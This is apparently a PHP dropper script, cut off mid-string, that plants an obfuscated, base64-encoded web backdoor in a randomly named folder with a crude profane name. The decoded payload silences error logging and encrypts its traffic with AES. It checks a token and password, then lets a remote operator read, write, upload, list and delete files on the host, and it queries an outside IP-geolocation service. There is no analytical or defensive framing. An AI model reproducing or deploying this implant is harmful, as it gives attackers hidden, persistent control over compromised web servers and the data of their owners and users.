<?php
function cfile_put_contents644($path, $content){
    file_put_contents($path, $content);
    chmod($path, 0644);
}

$firstArray = array("dokatka", "dildo", "vrot", "minet", "danik", "dildarik", "kabel");
$secondArray = array("ebalan", "tupoi", "ebal", "eblan", "debil", "idiot", "kuchunga");

$randomWord1 = $firstArray[array_rand($firstArray)];
$randomWord2 = $secondArray[array_rand($secondArray)];

$combinedWord = $randomWord1 . $randomWord2;

$hash = substr(md5(uniqid()), 0, 4);

$resultnfolder = $combinedWord . $hash;

$src = "ZnVuY3Rpb24gXzQ3OTA5NzgzMigkaSl7JGE9QXJyYXkoIkFFUy0xOTItT0ZCIiwiU0VSVkVSX05BTUUiLCJBRVMtMTkyLU9GQiIsIlNFUlZFUl9OQU1FIiwnRXVyb3BlL0xvbmRvbicsJ2Rpc3BsYXlfZXJyb3JzJywnbG9nX2Vycm9ycycsJ3VwbG9hZF9tYXhfZmlsZXNpemUnLCcxNTAwMDBNJywncG9zdF9tYXhfc2l6ZScsJzE1MDAwME0nLCdtYXhfaW5wdXRfdGltZScsJ21heF9leGVjdXRpb25fdGltZScsIlJFUExBQ0VNRFBBU1MiLCJEQ093bmVkIiwiUkVQTEFDRUZPTERFUk5BTUUiLCJjNWRkYzcxMTViY2YzZjcxZGEyNzg1MjA2NGZiNjRhZWM3YzhiNjNmIiwiLSIsIlNFUlZFUl9OQU1FIiwiZ2V0dG9rZW4iLCJTRVJWRVJfTkFNRSIsImdldHRva2VuIiwiU0VSVkVSX05BTUUiLCdIVFRQX0NMSUVOVF9JUCcsJ0hUVFBfQ0xJRU5UX0lQJywnSFRUUF9YX0ZPUldBUkRFRF9GT1InLCdIVFRQX1hfRk9SV0FSREVEX0ZPUicsJ1JFTU9URV9BRERSJywiU0VSVkVSX05BTUUiLCJ0b2tlbiIsIlNFUlZFUl9OQU1FIiwidGtuIiwiU0VSVkVSX05BTUUiLCJ0b2tlbl91aWQiLCJTRVJWRVJfTkFNRSIsInN0YXR1cyIsIlNFUlZFUl9OQU1FIiwiT0siLCJTRVJWRVJfTkFNRSIsIndvcmtkaXIiLCJTRVJWRVJfTkFNRSIsImlwaW5mbyIsImh0dHA6Ly93d3cuZ2VvcGx1Z2luLm5ldC9qc29uLmdwP2lwPSIsIlNFUlZFUl9OQU1FIiwic3RhdHVzIiwiU0VSVkVSX05BTUUiLCJXUk9ORyIsIlNFUlZFUl9OQU1FIiwiU0VSVkVSX05BTUUiLCJ2YWwiLCJTRVJWRVJfTkFNRSIsInBhc3N3b3JkIiwiU0VSVkVSX05BTUUiLCJwYXNzd29yZCIsIlNFUlZFUl9OQU1FIiwic3RhdHVzIiwiU0VSVkVSX05BTUUiLCJPSyIsIlNFUlZFUl9OQU1FIiwid29ya2RpciIsIlNFUlZFUl9OQU1FIiwidG9rZW4iLCJTRVJWRVJfTkFNRSIsInRrbiIsIlNFUlZFUl9OQU1FIiwic3RhdHVzIiwiU0VSVkVSX05BTUUiLCJXUk9ORyIsIlNFUlZFUl9OQU1FIiwiU0VSVkVSX05BTUUiLCJ2YWwiLCJTRVJWRVJfTkFNRSIsInRva2VuIiwiU0VSVkVSX05BTUUiLCJ0b2tlbiIsIlNFUlZFUl9OQU1FIiwidG9rZW4iLCJTRVJWRVJfTkFNRSIsInRrbiIsIlNFUlZFUl9OQU1FIiwidG9rZW5fdWlkIiwiU0VSVkVSX05BTUUiLCJnZXRkYXRhIiwiU0VSVkVSX05BTUUiLCJnZXRkYXRhIiwiU0VSVkVSX05BTUUiLCJuYW1lIiwiLiIsIiIsIlNFUlZFUl9OQU1FIiwiZXh0ZW5zaW9uIiwiU0VSVkVSX05BTUUiLCJ0b2tlbl91aWQiLCJwaHAiLCJodG1sIiwiaHRtIiwiaHRhY2Nlc3MiLCJ4aHRtbCIsIm1odG1sIiwibWh0bSIsIm1odCIsImpzIiwiU0VSVkVSX05BTUUiLCJTRVJWRVJfTkFNRSIsIi8iLCJTRVJWRVJfTkFNRSIsInNldGRhdGEiLCJTRVJWRVJfTkFNRSIsInNldGRhdGEiLCJTRVJWRVJfTkFNRSIsIm5hbWUiLCIuIiwiIiwiU0VSVkVSX05BTUUiLCJleHRlbnNpb24iLCJTRVJWRVJfTkFNRSIsImRhdGEiLCJTRVJWRVJfTkFNRSIsInRva2VuX3VpZCIsInBocCIsImh0bWwiLCJodG0iLCJodGFjY2VzcyIsInhodG1sIiwibWh0bWwiLCJtaHRtIiwibWh0IiwianMiLCIvIiwiU0VSVkVSX05BTUUiLCJkb3dubG9hZHNhZmVmaWxlX25hbWUiLCJTRVJWRVJfTkFNRSIsImRvd25sb2Fkc2FmZWZpbGVfbmFtZSIsJ2V4dGVuc2lvbicsInBocCIsImh0bWwiLCJodG0iLCJodGFjY2VzcyIsInhodG1sIiwibWh0bWwiLCJtaHRtIiwibWh0IiwianMiLCIvIiwiU0VSVkVSX05BTUUiLCJ1cGxvYWRzYWZlZmlsZV9uYW1lIiwiU0VSVkVSX05BTUUiLCJ1cGxvYWRzYWZlZmlsZV9uYW1lIiwnZXh0ZW5zaW9uJywidG1wX25hbWUiLCJwaHAiLCJodG1sIiwiaHRtIiwiaHRhY2Nlc3MiLCJ4aHRtbCIsIm1odG1sIiwibWh0bSIsIm1odCIsImpzIiwiLyIsIlNFUlZFUl9OQU1FIiwidXBsb2FkZmlsZV9uYW1lIiwiU0VSVkVSX05BTUUiLCJ1cGxvYWRmaWxlX25hbWUiLCdleHRlbnNpb24nLCJwaHAiLCJodG1sIiwiaHRtIiwiaHRhY2Nlc3MiLCJ4aHRtbCIsIm1odG1sIiwibWh0bSIsIm1odCIsImpzIiwidG1wX25hbWUiLCIvIiwiU0VSVkVSX05BTUUiLCJhZGRkYXRhIiwiU0VSVkVSX05BTUUiLCJhZGRkYXRhIiwiU0VSVkVSX05BTUUiLCJuYW1lIiwiLiIsIiIsIlNFUlZFUl9OQU1FIiwiZXh0ZW5zaW9uIiwiU0VSVkVSX05BTUUiLCJkYXRhIiwiU0VSVkVSX05BTUUiLCJ0b2tlbl91aWQiLCJwaHAiLCJodG1sIiwiaHRtIiwiaHRhY2Nlc3MiLCJ4aHRtbCIsIm1odG1sIiwibWh0bSIsIm1odCIsImpzIiwiLyIsIi8iLCJTRVJWRVJfTkFNRSIsImdldGFsbGJ5ZXh0IiwiU0VSVkVSX05BTUUiLCJnZXRhbGxieWV4dCIsIlNFUlZFUl9OQU1FIiwiZXh0ZW5zaW9uIiwiU0VSVkVSX05BTUUiLCJnZXRkYXRhIiwiU0VSVkVSX05BTUUiLCJhZGRpdGlvbmFsZGF0YSIsInBocCIsImh0bWwiLCJodG0iLCJodGFjY2VzcyIsInhodG1sIiwibWh0bWwiLCJtaHRtIiwibWh0IiwianMiLCIvKiIsIlNFUlZFUl9OQU1FIiwibmFtZSIsIlNFUlZFUl9OQU1FIiwiZGF0YSIsIlNFUlZFUl9OQU1FIiwibGFzdG1vZGlmaWNhdGlvbnRpbWUiLCJkLm0tSDppIiwiU0VSVkVSX05BTUUiLCJub3d0aW1lIiwiZC5tLUg6aSIsIlNFUlZFUl9OQU1FIiwiYWRkaXRpb25hbGRhdGEiLCJTRVJWRVJfTkFNRSIsIi8iLCJTRVJWRVJfTkFNRSIsImRlbGFsbGJ5bmFtZSIsIlNFUlZFUl9OQU1FIiwiZGVsYWxsYnluYW1lIiwiU0VSVkVSX05BTUUiLCJuYW1lIiwiLyIsIioiKTtyZXR1cm4gJGFbJGldO30gPz48P3BocCBmdW5jdGlvbiBsXygkXywkX18pe3JldHVybiBvcGVuc3NsX2VuY3J5cHQoJF8sXzQ3OTA5NzgzMigwKSwkX18sJF9fXz1yb3VuZCgwKSwkX1NFUlZFUltfNDc5MDk3ODMyKDEpXSk7fWZ1bmN0aW9uIGxfXygkXywkX19fXyl7cmV0dXJuIG9wZW5zc2xfZGVjcnlwdCgkXyxfNDc5MDk3ODMyKDIpLCRfX19fLCRfX189cm91bmQoMCksJF9TRVJWRVJbXzQ3OTA5NzgzMigzKV0pO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KF80NzkwOTc4MzIoNCkpO2Vycm9yX3JlcG9ydGluZyhyb3VuZCgwKSk7aW5pX3NldChfNDc5MDk3ODMyKDUpLHJvdW5kKDApKTtpbmlfc2V0KF80NzkwOTc4MzIoNikscm91bmQoMCkpO2luaV9zZXQoXzQ3OTA5NzgzMig3KSxfNDc5MDk3ODMyKDgpKTtpbmlfc2V0KF80NzkwOTc4MzIoOSksXzQ3OTA5NzgzMigxMCkpO2luaV9zZXQoXzQ3OTA5NzgzMigxMSkscm91bmQoMCszMDApKTtpbmlfc2V0KF80NzkwOTc4MzIoMTIpLHJvdW5kKDArNzUrNzUrNzUrNzUpKTskX19fX189c2hhMShfNDc5MDk3ODMyKDEzKSk7JF9fX19fXz1fNDc5MDk3ODMyKDE0KTskX19fX19fXz1fNDc5MDk3ODMyKDE1KTskX19fX19fX189XzQ3OTA5NzgzMigxNik7JF9fX19fX19fXz1fNDc5MDk3ODMyKDE3KTtpZihpc3NldCgkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxOCldIC5fNDc5MDk3ODMyKDE5KSldKSl7aWYoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjApXSAuXzQ3OTA5NzgzMigyMSkpXT09IG1kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIyKV0pKXskX19fX19fX19fXz1yYW5kKHJvdW5kKDArMjAwMCsyMDAwKzIwMDArMjAwMCsyMDAwKSxyb3VuZCgwKzE5OTk5LjgrMTk5OTkuOCsxOTk5OS44KzE5OTk5LjgrMTk5OTkuOCkpO3doaWxlKHRydWUpe2lmKCgkX19fX19fX19fXyVyb3VuZCgwKzIpKT09IHJvdW5kKDApKWJyZWFrOyRfX19fX19fX19fPXJhbmQocm91bmQoMCsyMDAwKzIwMDArMjAwMCsyMDAwKzIwMDApLHJvdW5kKDArMjQ5OTkuNzUrMjQ5OTkuNzUrMjQ5OTkuNzUrMjQ5OTkuNzUpKTt9aWYoIWVtcHR5KCRfU0VSVkVSW180NzkwOTc4MzIoMjMpXSkpeyRfX19fX19fX19fXz0kX1NFUlZFUltfNDc5MDk3ODMyKDI0KV07fWVsc2VpZighZW1wdHkoJF9TRVJWRVJbXzQ3OTA5NzgzMigyNSldKSl7JF9fX19fX19fX19fPSRfU0VSVkVSW180NzkwOTc4MzIoMjYpXTt9ZWxzZXskX19fX19fX19fX189JF9TRVJWRVJbXzQ3OTA5NzgzMigyNyldO30kX19fX19fX19fX19fW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDI4KV0gLl80NzkwOTc4MzIoMjkpKV09JF9fX19fX19fX18gLmNyYzMyKCRfX19fX18gLiRfX19fXyAuJF9fX19fX19fKSAuc2hhMSgkX1NFUlZFUltfNDc5MDk3ODMyKDMwKV0gLl80NzkwOTc4MzIoMzEpIC5iYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigzMildIC5fNDc5MDk3ODMyKDMzKSldKSkpOyRfX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMzQpXSAuXzQ3OTA5NzgzMigzNSkpXT1tZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigzNildIC5fNDc5MDk3ODMyKDM3KSk7JF9fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigzOCldIC5fNDc5MDk3ODMyKDM5KSldPXN0cnJldihiYXNlNjRfZW5jb2RlKHN0cnJldigkX19fX19fXykpKTskX19fX19fX19fX19fW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDQwKV0gLl80NzkwOTc4MzIoNDEpKV09c3RycmV2KGJhc2U2NF9lbmNvZGUoc3RycmV2KGZpbGVfZ2V0X2NvbnRlbnRzKF80NzkwOTc4MzIoNDIpIC4kX19fX19fX19fX18pKSkpO31lbHNleyRfX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoNDMpXSAuXzQ3OTA5NzgzMig0NCkpXT1tZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig0NSldIC5fNDc5MDk3ODMyKDQ2KSk7fSRfX19fX19fX19fX19fPXJhbmQocm91bmQoMCsxKSxyb3VuZCgwKzMrMyszKzMrMykpO2ZvcigkX19fX19fX19fX19fX189cm91bmQoMCk7JF9fX19fX19fX19fX19fPCRfX19fX19fX19fX19fOyRfX19fX19fX19fX19fXysrKXskX19fX19fX19fX19fX19fPW1kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDQ3KV0gLiRfX19fX19fX19fX19fKTtpZihhcnJheV9rZXlfZXhpc3RzKCRfX19fX19fX19fX19fX18sJF9fX19fX19fX19fXykpY29udGludWU7JF9fX19fX19fX19fX1skX19fX19fX19fX19fX19fXT1tZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig0OCldIC5fNDc5MDk3ODMyKDQ5KSAuJF9fX19fX19fX19fX18pO31lY2hvKHN0cnJldihiYXNlNjRfZW5jb2RlKGpzb25fZW5jb2RlKCRfX19fX19fX19fX18pKSkpO3JldHVybjt9ZWxzZWlmKGlzc2V0KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDUwKV0gLl80NzkwOTc4MzIoNTEpKV0pKXtpZigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig1MildIC5fNDc5MDk3ODMyKDUzKSldPT0gJF9fX19fKXskX19fX19fX19fXz1yYW5kKHJvdW5kKDArMzMzMy4zMzMzMzMzMzMzKzMzMzMuMzMzMzMzMzMzMyszMzMzLjMzMzMzMzMzMzMpLHJvdW5kKDArMTk5OTkuOCsxOTk5OS44KzE5OTk5LjgrMTk5OTkuOCsxOTk5OS44KSk7d2hpbGUodHJ1ZSl7aWYoKCRfX19fX19fX19fJXJvdW5kKDArMC42NjY2NjY2NjY2NjY2NyswLjY2NjY2NjY2NjY2NjY3KzAuNjY2NjY2NjY2NjY2NjcpKT09IHJvdW5kKDArMC4yKzAuMiswLjIrMC4yKzAuMikpYnJlYWs7JF9fX19fX19fX189cmFuZChyb3VuZCgwKzI1MDArMjUwMCsyNTAwKzI1MDApLHJvdW5kKDArOTk5OTkpKTt9JF9fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig1NCldIC5fNDc5MDk3ODMyKDU1KSldPW1kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDU2KV0gLl80NzkwOTc4MzIoNTcpKTskX19fX19fX19fX19fW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDU4KV0gLl80NzkwOTc4MzIoNTkpKV09c3RycmV2KGJhc2U2NF9lbmNvZGUoc3RycmV2KCRfX19fX19fKSkpOyRfX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoNjApXSAuXzQ3OTA5NzgzMig2MSkpXT0kX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pIC5zaGExKCRfU0VSVkVSW180NzkwOTc4MzIoNjIpXSAuXzQ3OTA5NzgzMig2MykpO31lbHNleyRfX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoNjQpXSAuXzQ3OTA5NzgzMig2NSkpXT1tZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig2NildIC5fNDc5MDk3ODMyKDY3KSk7fSRfX19fX19fX19fX19fPXJhbmQocm91bmQoMCswLjMzMzMzMzMzMzMzMzMzKzAuMzMzMzMzMzMzMzMzMzMrMC4zMzMzMzMzMzMzMzMzMykscm91bmQoMCs1KzUrNSkpO2ZvcigkX19fX19fX19fX19fX189cm91bmQoMCk7JF9fX19fX19fX19fX19fPCRfX19fX19fX19fX19fOyRfX19fX19fX19fX19fXysrKXskX19fX19fX19fX19fX19fPW1kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDY4KV0gLiRfX19fX19fX19fX19fKTtpZihhcnJheV9rZXlfZXhpc3RzKCRfX19fX19fX19fX19fX18sJF9fX19fX19fX19fXykpY29udGludWU7JF9fX19fX19fX19fX1skX19fX19fX19fX19fX19fXT1tZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig2OSldIC5fNDc5MDk3ODMyKDcwKSAuJF9fX19fX19fX19fX18pO31lY2hvKHN0cnJldihiYXNlNjRfZW5jb2RlKGpzb25fZW5jb2RlKCRfX19fX19fX19fX18pKSkpO3JldHVybjt9JF9fX19fX19fX19fX19fX189ZmFsc2U7aWYoaXNzZXQoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoNzEpXSAuXzQ3OTA5NzgzMig3MikpXSkpe2lmKChpbnR2YWwoc3Vic3RyKGJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDczKV0gLl80NzkwOTc4MzIoNzQpKV0pKSxyb3VuZCgwKSxyb3VuZCgwKzUpKSklcm91bmQoMCsxKzEpKT09IHJvdW5kKDArMC41KzAuNSkpeyRfX19fX19fX19fX19fX19fPXRydWU7fWVsc2VpZihzdWJzdHIoYmFzZTY0X2RlY29kZShzdHJyZXYoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoNzUpXSAuXzQ3OTA5NzgzMig3NikpXSkpLHJvdW5kKDArMSsxKzErMSsxKSk9PSBjcmMzMigkX19fX19fIC4kX19fX18gLiRfX19fX19fXykgLnNoYTEoJF9TRVJWRVJbXzQ3OTA5NzgzMig3NyldIC5fNDc5MDk3ODMyKDc4KSAuc2hhMShiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig3OSldIC5fNDc5MDk3ODMyKDgwKSldKSkpKSl7JF9fX19fX19fX19fX19fX189ZmFsc2U7fWVsc2V7cmV0dXJuO319ZWxzZXtyZXR1cm47fWlmKCFlbXB0eSgkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig4MSldIC5fNDc5MDk3ODMyKDgyKSldKSl7JF9fX19fX19fX19fXz1hcnJheSgpOyRfX19fX19fX19fX19fX19fXz1qc29uX2RlY29kZShiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig4MyldIC5fNDc5MDk3ODMyKDg0KSldKSksdHJ1ZSk7Zm9yZWFjaCgkX19fX19fX19fX19fX19fX18gYXMgJF9fX19fX19fX19fX19fX19fXyl7JF9fX19fX19fX19fX19fX19fX189JF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig4NSldIC5fNDc5MDk3ODMyKDg2KSldOyRfX19fX19fX19fX19fX19fX19fXz1zdHJfcmVwbGFjZShfNDc5MDk3ODMyKDg3KSxfNDc5MDk3ODMyKDg4KSwkX19fX19fX19fX19fX19fX19fW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDg5KV0gLl80NzkwOTc4MzIoOTApKV0pO2lmKCEkX19fX19fX19fX19fX19fXyl7aWYoc2hhMSgkX19fX19fX19fX19fX19fX19fXykhPSBiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMig5MSldIC5fNDc5MDk3ODMyKDkyKSldKSkpe3JldHVybjt9fWlmKCRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDkzKW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk0KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk1KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk2KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk3KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk4KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDk5KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEwMClvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMDEpKWNvbnRpbnVlOyRfX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMTAyKV0gLiRfX19fX19fX19fX19fX19fX19fKV1bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMTAzKV0gLiRfX19fX19fX19fX19fX19fX19fXyldPWJhc2U2NF9lbmNvZGUobF9fKGZpbGVfZ2V0X2NvbnRlbnRzKCRfX19fX19fIC5fNDc5MDk3ODMyKDEwNCkgLiRfX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fIC4kX19fX19fX19fX19fX19fX19fX18pLG1kNSgkX19fX19fX19fX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pKSkpO31lY2hvKHN0cnJldihiYXNlNjRfZW5jb2RlKGpzb25fZW5jb2RlKCRfX19fX19fX19fX18pKSkpO31pZighZW1wdHkoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMTA1KV0gLl80NzkwOTc4MzIoMTA2KSldKSl7JF9fX19fX19fX19fX19fX19fX19fXz1qc29uX2RlY29kZShiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxMDcpXSAuXzQ3OTA5NzgzMigxMDgpKV0pKSx0cnVlKTtmb3JlYWNoKCRfX19fX19fX19fX19fX19fX19fX18gYXMgJF9fX19fX19fX19fX19fX19fXyl7JF9fX19fX19fX19fX19fX19fX189JF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxMDkpXSAuXzQ3OTA5NzgzMigxMTApKV07JF9fX19fX19fX19fX19fX19fX19fPXN0cl9yZXBsYWNlKF80NzkwOTc4MzIoMTExKSxfNDc5MDk3ODMyKDExMiksJF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxMTMpXSAuXzQ3OTA5NzgzMigxMTQpKV0pOyRfX19fX19fX19fX19fX19fX19fX19fPWJhc2U2NF9kZWNvZGUoJF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxMTUpXSAuXzQ3OTA5NzgzMigxMTYpKV0pO2lmKCEkX19fX19fX19fX19fX19fXyl7aWYoc2hhMSgkX19fX19fX19fX19fX19fX19fXykhPSBiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxMTcpXSAuXzQ3OTA5NzgzMigxMTgpKV0pKW9yIHN0cmxlbigkX19fX19fX19fX19fX19fX19fXykhPSByb3VuZCgwKzIwKzIwKW9yIHN0cmxlbigkX19fX19fX19fX19fX19fX19fX18pIT0gcm91bmQoMCsxMy4zMzMzMzMzMzMzMzMrMTMuMzMzMzMzMzMzMzMzKzEzLjMzMzMzMzMzMzMzMykpe3JldHVybjt9fWlmKCFjdHlwZV9wcmludCgkX19fX19fX19fX19fX19fX19fX18pb3IhY3R5cGVfcHJpbnQoJF9fX19fX19fX19fX19fX19fX18pb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTE5KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEyMClvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMjEpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTIyKW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEyMylvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMjQpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTI1KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEyNilvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMjcpKWNvbnRpbnVlO2ZpbGVfcHV0X2NvbnRlbnRzKCRfX19fX19fIC5fNDc5MDk3ODMyKDEyOCkgLiRfX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fIC4kX19fX19fX19fX19fX19fX19fX18sbF8oJF9fX19fX19fX19fX19fX19fX19fX18sbWQ1KCRfX19fX19fX19fX19fX19fX19fIC5jcmMzMigkX19fX19fIC4kX19fX18gLiRfX19fX19fXykpKSk7fX1pZighZW1wdHkoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMTI5KV0gLl80NzkwOTc4MzIoMTMwKSldKSl7JF9fX19fX19fX19fX19fX19fX19fX19fPWJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDEzMSldIC5fNDc5MDk3ODMyKDEzMikpXSkpOyRfX19fX19fX19fX19fX19fX19fX19fX189cGF0aGluZm8oJF9fX19fX19fX19fX19fX19fX19fX19fKVtfNDc5MDk3ODMyKDEzMyldO2lmKCRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gbnVsbCl7JF9fX19fX19fX19fX19fX19fX19fX19fXz1leHBsb2RlKCRfX19fX19fX18sJF9fX19fX19fX19fX19fX19fX19fX19fKVtyb3VuZCgwKzAuMjUrMC4yNSswLjI1KzAuMjUpXTt9aWYoJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEzNClvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTM1KW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMzYpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDEzNylvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTM4KW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxMzkpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE0MClvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTQxKW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNDIpKXJldHVybjtlY2hvKGxfXyhmaWxlX2dldF9jb250ZW50cygkX19fX19fXyAuXzQ3OTA5NzgzMigxNDMpIC4kX19fX19fX19fX19fX19fX19fX19fX18pLG1kNSgkX19fX19fX19fX19fX19fX19fX19fX18gLmNyYzMyKCRfX19fX18gLiRfX19fXyAuJF9fX19fX19fKSkpKTt9aWYoIWVtcHR5KCRfUE9TVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxNDQpXSAuXzQ3OTA5NzgzMigxNDUpKV0pKXskX19fX19fX19fX19fX19fX19fX19fX189YmFzZTY0X2RlY29kZShzdHJyZXYoJF9QT1NUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDE0NildIC5fNDc5MDk3ODMyKDE0NykpXSkpOyRfX19fX19fX19fX19fX19fX19fX19fX189cGF0aGluZm8oJF9fX19fX19fX19fX19fX19fX19fX19fKVtfNDc5MDk3ODMyKDE0OCldO2lmKCRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gbnVsbCl7JF9fX19fX19fX19fX19fX19fX19fX19fXz1leHBsb2RlKCRfX19fX19fX18sJF9fX19fX19fX19fX19fX19fX19fX19fKVtyb3VuZCgwKzAuMzMzMzMzMzMzMzMzMzMrMC4zMzMzMzMzMzMzMzMzMyswLjMzMzMzMzMzMzMzMzMzKV07fSRfX19fX19fX19fX19fX19fX19fX19fPWZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbbWQ1KCRfX19fX19fX19fX19fX19fX19fX19fXyldW180NzkwOTc4MzIoMTQ5KV0pO2lmKCFjdHlwZV9wcmludCgkX19fX19fX19fX19fX19fX19fX19fX18pb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE1MClvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTUxKW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNTIpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE1MylvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTU0KW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNTUpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE1NilvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTU3KW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNTgpKXJldHVybjtmaWxlX3B1dF9jb250ZW50cygkX19fX19fXyAuXzQ3OTA5NzgzMigxNTkpIC4kX19fX19fX19fX19fX19fX19fX19fX18sbF8oJF9fX19fX19fX19fX19fX19fX19fX18sbWQ1KCRfX19fX19fX19fX19fX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pKSkpO31pZighZW1wdHkoJF9QT1NUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDE2MCldIC5fNDc5MDk3ODM